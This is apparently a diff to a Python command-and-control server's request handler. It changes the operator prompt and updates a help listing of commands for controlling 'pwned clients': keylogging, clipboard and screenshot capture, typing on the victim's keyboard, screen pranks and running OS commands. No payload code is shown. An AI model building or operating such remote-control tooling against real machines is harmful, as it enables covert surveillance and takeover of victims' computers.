@@ -124,7 +124,7 @@ class C2Handler(BaseHTTPRequestHandler):
                     try:
                         # Azure kill a waiting HTTP GET Session after 4 minutes(230 seconds in Windows & 240 in Linux)
                         # so we must handle input with a timeout as below
-                        command = inputimeout(f"({clientIp}){clientAccount}@{clientHostname}:{cwd} => ",
+                        command = inputimeout(f"({clientIp}){clientAccount}@{clientHostname}:{cwd}$ ",
                                               timeout=INPUT_TIMEOUT)
 
                     # if a timeout Occurs on our input, do a simple command to trigger a new session
@@ -132,8 +132,8 @@ class C2Handler(BaseHTTPRequestHandler):
                         command = KEEP_ALIVE_CMD
                 else:
                     # Collect Command from regular input to run on the c2 client
-                    command = input(Fore.RESET + f"({clientIp}){clientAccount}@{clientHostname}:{cwd} "
-                                                 f"=> " + Fore.LIGHTYELLOW_EX)
+                    command = input(Fore.RESET + f"({clientIp}){clientAccount}@{clientHostname}:{cwd}:"
+                                                 f"$ " + Fore.LIGHTYELLOW_EX)
                     print(Fore.RESET)
 
                 if command.startswith("server "):
@@ -261,17 +261,18 @@ class C2Handler(BaseHTTPRequestHandler):
                               "client unzip FILENAME - unzip and decrypt a file on the client",
                               "client kill - permanently shutdown the active client",
                               "client delay SECONDS - change the delay setting for a client's reconnection attempts",
-                              "client get clipboard - grab a copy of the client's clipboard (coming soon)",
-                              "client keylog on - start up a keylogger on the client (coming soon)",
-                              "client keylog off - turn off the keylogger on the client and write the results to disk"
-                              " (coming soon)",
-                              "client screenshot - grab a copy of the client's screens (coming soon)",
-                              "client display FILENAME - display an image on the client's screen (coming soon)",
-                              "client flip screen - flip a client's screen upside down (coming soon)",
-                              "client max sound - turn a client's volume all the way up (coming soon)",
-                              "client play FILENAME.wav - play a .wav sound file on the client (coming soon)",
+                              "client get clipboard - grab a copy of the client's clipboard",
+                              "client keylog on - start up a keylogger on the client",
+                              "client keylog off - turn off the keylogger on the client and write the results to disk",
+                              "client type TEXT - Type the text you choice on a client's keyboard",
+                              "client screenshot - grab a copy of the client's screens",
+                              "client display FILENAME - display an image on the client's screen",
+                              "client flip screen - client flip - flip a client's screen upside down",
+                              "client roll screen - client roll - flip a client's screen upside down",
+                              "client max sound - client max - turn a client's volume all the way up",
+                              "client play FILENAME.wav - play a .wav sound file on the client",
                               "* - run an OS command on the client that doesn't require input",
-                              "* & - run an OS command on the client in the background (coming soon)", sep="\n")
+                              "* & - run an OS command on the client in the background", sep="\n")
                         # Print Server Commands
                         print("\nServer Commands:",
                               "server show clients - print an active listing of our pwned clients",
